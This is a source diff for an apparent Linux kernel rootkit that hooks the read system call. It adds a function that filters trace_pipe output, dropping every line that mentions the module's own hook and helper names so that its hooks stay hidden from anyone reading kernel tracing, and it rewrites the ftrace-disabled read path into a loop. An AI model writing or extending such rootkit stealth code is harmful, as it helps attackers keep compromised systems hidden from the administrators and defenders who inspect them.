@@ -274,9 +274,12 @@ notrace static bool line_contains_sensitive_info(const char *line) {
             strstr(line, "singularity") != NULL || strstr(line, "Singularity") != NULL ||
             strstr(line, "matheuz") != NULL || strstr(line, "zer0t") != NULL ||
             strstr(line, "hook") != NULL || strstr(line, "hooked_") != NULL ||
+            strstr(line, "constprop") != NULL ||
             strstr(line, "kallsyms_lookup_name") != NULL || strstr(line, "obliviate") != NULL ||
             strstr(line, "clear_taint") != NULL || strstr(line, "filter_buffer") != NULL ||
-            strstr(line, "filter_kmsg") != NULL || strstr(line, "filter_trace") != NULL);
+            strstr(line, "filter_kmsg") != NULL || strstr(line, "filter_trace") != NULL ||
+            strstr(line, "fh_install") != NULL || strstr(line, "fh_remove") != NULL ||
+            strstr(line, "ftrace_helper") != NULL);
 }
 
 notrace static bool is_virtual_file(struct file *file) {
@@ -476,6 +479,75 @@ notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf,
     return ret;
 }
 
+notrace static ssize_t filter_trace_pipe_output(char __user *user_buf, ssize_t bytes_read)
+{
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return bytes_read;
+
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    filtered_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+
+    line_start = kernel_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = *line_end;
+        *line_end = '\0';
+        
+        if (!line_contains_sensitive_info(line_start)) {
+            if (filtered_len + line_len + 1 <= bytes_read) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+        
+        *line_end = saved;
+        line_start = line_end + 1;
+    }
+
+    if (*line_start && !line_contains_sensitive_info(line_start)) {
+        size_t remaining = strlen(line_start);
+        if (filtered_len + remaining <= bytes_read) {
+            memcpy(filtered_buf + filtered_len, line_start, remaining);
+            filtered_len += remaining;
+        }
+    }
+
+    if (filtered_len == 0) {
+        kfree(kernel_buf);
+        kfree(filtered_buf);
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kfree(kernel_buf);
+        kfree(filtered_buf);
+        return -EFAULT;
+    }
+
+    kfree(kernel_buf);
+    kfree(filtered_buf);
+    return filtered_len;
+}
 
 static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
     struct file *file;
@@ -535,14 +607,27 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
         
         if (ftrace_disabled) {
             fput(file);
-            return orig_read(regs);
+            do {
+                orig_res = orig_read(regs);
+                if (orig_res < 0) {
+                    return orig_res;
+                }
+                
+                if (orig_res == 0) {
+                    return 0;
+                }
+
+                if (signal_pending(current)) {
+                    return -EINTR;
+                }
+            } while (1);
         }
         
         orig_res = orig_read(regs);
         fput(file);
         if (orig_res <= 0)
             return orig_res;
-        return filter_trace_output(user_buf, orig_res);
+        return filter_trace_pipe_output(user_buf, orig_res);
     }
 
     if (is_trace_file(file)) {
@@ -660,14 +745,25 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
         
         if (ftrace_disabled) {
             fput(file);
-            return orig_read_ia32(regs);
+            do {
+                orig_res = orig_read_ia32(regs);
+                if (orig_res < 0) {
+                    return orig_res;
+                }
+                if (orig_res == 0) {
+                    return 0;
+                }
+                if (signal_pending(current)) {
+                    return -EINTR;
+                }
+            } while (1);
         }
         
         orig_res = orig_read_ia32(regs);
         fput(file);
         if (orig_res <= 0)
             return orig_res;
-        return filter_trace_output(user_buf, orig_res);
+        return filter_trace_pipe_output(user_buf, orig_res);
     }
 
     if (is_trace_file(file)) {
